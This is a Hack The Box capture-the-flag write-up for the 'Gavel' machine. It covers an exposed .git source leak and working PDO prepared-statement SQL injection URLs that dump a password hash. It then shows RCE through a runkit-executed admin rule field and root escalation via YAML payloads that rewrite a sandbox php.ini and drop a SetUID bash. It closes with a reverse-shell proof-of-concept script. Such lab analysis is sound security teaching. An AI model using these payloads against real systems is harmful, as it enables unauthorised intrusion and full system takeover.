Gavel is a PHP auction site that leaks its own source code through an exposed `.git` directory, which turns out to matter a lot more than usual — reading the code is what makes a fairly obscure SQL injection technique findable at all. That injection dumps a password hash, cracking it gets an admin account, and admin access turns out to control a field that's later executed as raw PHP against every bid. From there it's a shell as `www-data`, password reuse into a second user, and a custom root-owned daemon that runs submitted PHP inside a locked-down sandbox — a sandbox with just enough left available to escape it.

# What the Source Reveals

## admin.php Exists

`index.php` only shows a link to `admin.php` when the logged-in session has `role === 'auctioneer'`:

```php
<?php if ($_SESSION['user']['role'] === 'auctioneer'): ?>
    <a class="nav-link" href="admin.php">Admin Panel</a>
<?php endif; ?>
```

`admin.php` itself enforces the same check on load, so this isn't just a hidden link — reaching the page's functionality actually requires the `auctioneer` role, not just knowledge of the URL.

## Bidding Executes User-Supplied PHP

`includes/bid_handler.php` is where a submitted bid gets validated — session check, auction lookup, balance check, all fairly standard. Then it does something unusual:

```php
$rule = $auction['rule'];
$rule_message = $auction['message'];

if (function_exists('ruleCheck')) {
    runkit_function_remove('ruleCheck');
}
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

Each auction row has a `rule` column — a raw string of PHP code — and it gets compiled into a live function with `runkit_function_add()` and executed against every bid. `runkit` is a PHP extension that allows defining and modifying functions at runtime from strings, which is normally a strange thing to have enabled in production at all.

This isn't injectable by a regular bidder — the `rule` value comes from the database, not from bid input. But `admin.php` has a form that updates exactly this column:

```php
$stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
$stmt->execute([$rule, $message, $auction_id]);
```

So whoever holds the `auctioneer` role can write arbitrary PHP into a field that later executes automatically, on the next bid, with no further review. That's RCE — the only thing standing in the way is getting that role.

## An IDOR, Noted in Passing

`inventory.php` reads a `user_id` from POST/GET and trusts it over the session's own ID when fetching inventory — meaning any logged-in user can view another account's items just by supplying their ID. It's a real bug, but it isn't part of the path forward here, so it's just worth flagging rather than chasing.

# A Backtick-Quoted SQL Injection

The same file has a second, more useful bug. It builds a sort column like this:

```php
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$col = "`" . str_replace("`", "", $sortItem) . "`";
...
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

At first glance this looks safe from injection — backticks are stripped from the input, then the whole thing is re-wrapped in backticks, which in MySQL quote an identifier (a column or table name), not a value. There's no way to close that quoting and break into the query directly.

Except PDO prepared statements are still a template being filled in after the fact, and that template only has one placeholder — the `user_id` in the `WHERE` clause. If the `sort` value can smuggle a *second* `?` into the query text before PDO ever binds anything, PDO will happily fill both placeholders from the single value it's given, since it has no idea the identifier portion isn't supposed to be dynamic.

That's the technique published by Searchlight Cyber under the title *A Novel Technique for SQL Injection in PDO's Prepared Statements* — worth reading directly for the full mechanics, since it's a genuinely clever bypass. The short version: injecting an escaped placeholder plus a trailing backslash into the identifier position causes PDO's own value-escaping (which wraps values in single quotes) to land right where a matching single quote is needed to close out a crafted column name — turning the "safe" identifier slot into a second value slot the attacker fully controls.

## Building the Payload

```
http://gavel.htb/inventory.php?sort=\?;--+-%00&user_id=x`+FROM+(SELECT+VERSION()+AS+`%27x`)y;--+-
```

`sort` becomes the identifier `` `\?;-- -\0` ``. `user_id` becomes the value that fills *both* placeholders PDO now sees in the template — including the identifier slot, since the escaped backslash lines up a stray single quote to close the derived table's column name early. The result selects `VERSION()` out of a subquery aliased `y`, with the injected content doing double duty as both the column definition and the value being escaped around it.

![]({{ "/assets/images/Gavel/6.png" | relative_url }})

That confirms the version string comes back — the injection works.

## Enumerating the Database

Swapping in different subqueries walks the schema the normal way:

```
http://gavel.htb/inventory.php?sort=\?;--+-&user_id=x`+FROM+(SELECT+concat(table_schema,0x3a,table_name)+AS+`%27x`+FROM+information_schema.tables)y;--+-
```


(`0x676176656c` = `gavel`, `0x7573657273` = `users`.)

## Reverse Engineering gavel-util

```bash
file /usr/local/bin/gavel-util
```

```
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

`stats` and `invoice` return status information; `submit <file>` accepts a YAML file describing a new auction item. Exfiltrating the binary (`nc` in one direction, listener catching it in the other, `md5sum` to confirm a clean transfer) and loading it into Ghidra shows the actual mechanism: every command connects to a Unix domain socket at `/var/run/gaveld.sock`, builds a small JSON header (`op`, `flags`, `content_length`, and a captured environment block), and sends that header plus any file content over the socket. `gaveld` is the thing actually doing the work — `gavel-util` is just a client for it.

## Reverse Engineering gaveld

Same exfil-and-Ghidra process on `/opt/gavel/gaveld`. `main()` creates the listening socket, sets its ownership to `root:gavel-seller` with mode `0660`, then forks a handler process per incoming connection. The handler:

- Uses `SO_PEERCRED` to identify the connecting process's UID, and checks that user belongs to `gavel-seller` — group membership is the actual auth boundary here, not anything checked in `gavel-util` itself.
- Reads the JSON header and branches on `op`.
- For `submit`: parses the YAML payload, requires all six fields (`name`, `description`, `image`, `price`, `rule_msg`, `rule`), then hands the `rule` string to a function that validates it by actually running it through a sandboxed PHP interpreter before ever saving the submission.

That sandbox function is the interesting part:

```c
if (env_RULE_PATH_value has a valid, readable, regular file at that path) {
    // use env_RULE_PATH_value as the php.ini path
} else {
    // default to /opt/gavel/.config/php/php.ini
}
```

The daemon reads a `RULE_PATH` key out of the JSON `env` object that `gavel-util` sends along with every request — and if that path points to a real, readable file, it's used *as the php.ini for the sandboxed run instead of the hardened default*. Nothing in `gaveld` restricts what that path can be, and nothing stops a caller from setting `RULE_PATH` in their own environment before running `gavel-util` (which just forwards whatever environment it's called with).

## The Sandbox Itself

`/opt/gavel/.config/php/php.ini`:

```ini
open_basedir=/opt/gavel
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
allow_url_fopen=Off
allow_url_include=Off
```

Command execution, code injection via `eval`/`assert`, and most file/network I/O are all blocked. But `file_put_contents` isn't on that list — and `open_basedir` still permits writes anywhere under `/opt/gavel`, which includes the very `php.ini` file being used to enforce these restrictions in the first place.

# Two Ways to Root

## The Overwrite Path

Since `gaveld` re-launches a fresh PHP process pointed at the same config file for every submission, and `file_put_contents` still works, the sandbox can rewrite its own rulebook:

```yaml
name: "step one"
description: "reset the sandbox"
image: "https://example.com/x.png"
price: 100000
rule_msg: "n/a"
rule: "file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\nopen_basedir=\ndisable_functions=\n\"); return false;"
```

```bash
gavel-util submit step1.yaml
```

`php.ini` on disk now has no restrictions at all. The very next submission runs with a completely open sandbox:

```yaml
name: "step two"
description: "cash in"
image: "https://example.com/x.png"
price: 100000
rule_msg: "n/a"
rule: "system('cp /bin/bash /home/auctioneer/rootbash; chmod 6777 /home/auctioneer/rootbash;'); return false;"
```

```bash
gavel-util submit step2.yaml
```

```bash
ls -l ~/rootbash
```

```
-rwsrwsrwx 1 root root ... rootbash
```

```bash
~/rootbash -p
```

Root shell.

## The Intended Path — RULE_PATH

Rather than two submissions, the environment-variable behavior found in `gaveld` gets there in one:

```bash
cat > /dev/shm/open.ini << 'EOF'
engine=On
open_basedir=
disable_functions=
EOF
```

```yaml
name: "one shot"
description: "n/a"
image: "https://example.com/x.png"
price: 100000
rule_msg: "n/a"
rule: "system('cp /bin/bash /home/auctioneer/rootbash2; chmod 6777 /home/auctioneer/rootbash2;'); return false;"
```

```bash
RULE_PATH=/dev/shm/open.ini gavel-util submit oneshot.yaml
```

Without `RULE_PATH` set, this same submission fails outright — `system()` is disabled under the default sandbox. With it set, `gaveld` picks up the permissive config directly and the payload runs immediately.

```bash
~/rootbash2 -p
```

Root shell. `root.txt` readable from `/root`.

# A Gotcha Worth Knowing — Why /tmp Looked Empty

Placing the payload binary in `/tmp` instead of `/home/auctioneer` seems like the more natural choice, and the file appears to write successfully — but then it's nowhere to be found, even right after `gaveld` reports success.

```bash
mount | grep -e shm -e tmp
```

```
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
/dev/sda2 on /tmp type ext4 (rw,relatime)
```

`/dev/shm` is out regardless — it's mounted `nosuid`, so a SetUID binary placed there simply won't honor that bit. `/tmp` looks fine at the mount level, but Apache's systemd unit sets `PrivateTmp=true`, which gives every process descending from `apache2.service` — `www-data`, and anything `su`'d from it — its own isolated view of `/tmp`, invisible to everything else on the system. `gaveld` isn't part of that unit, so it writes to the real, shared `/tmp` — a location the web-spawned shell simply can't see. Writing to `/home/auctioneer` (or anywhere outside `/tmp`/`/var/tmp`) sidesteps the mismatch entirely.

# Summary

Exposed `.git` → recovered source reveals a PDO prepared-statement identifier-quoting bypass in `inventory.php` → SQLi dumps the `auctioneer` bcrypt hash → cracked password unlocks the admin panel → admin-editable `rule` field is compiled into a live PHP function via `runkit` on every bid → RCE, shell as `www-data` → password reuse gets a local shell as `auctioneer` → a root-owned Unix-socket daemon (`gaveld`) runs submitted auction rules through a sandboxed PHP interpreter → the sandbox's own `php.ini` is writable from inside itself (or swappable outright via an unchecked `RULE_PATH` environment variable) → root.

# Proof of Concept

I scripted the full chain end to end — login, rule injection, triggering the bid, the `www-data` shell, and both root-escalation steps via `gavel-util`. Grab it with:

```bash
wget "https://github.com/00vld/proof_of_concept/blob/main/HTB/gavel.py"
```

**What it does:** logs in as `auctioneer` (using the cracked password), pulls a live auction ID off the admin page, overwrites that auction's rule with a reverse-shell payload, places a bid to trigger it, catches the resulting `www-data` shell, `su`'s to `auctioneer`, then submits the two-hop `gavel-util` YAML payloads (php.ini overwrite, then a SetUID bash drop) to land a root shell — all routed through Burp on `127.0.0.1:8080` so the whole run is visible in the proxy history.

**Usage:**

```bash
python3 gavel.py <target_ip>
```

Have Burp listening on `127.0.0.1:8080` first, and make sure local ports `9001` and `4444` are free before running it — those are the two callback listeners the script opens for the `www-data` and root shells respectively.

Successfully [*Pwned*].
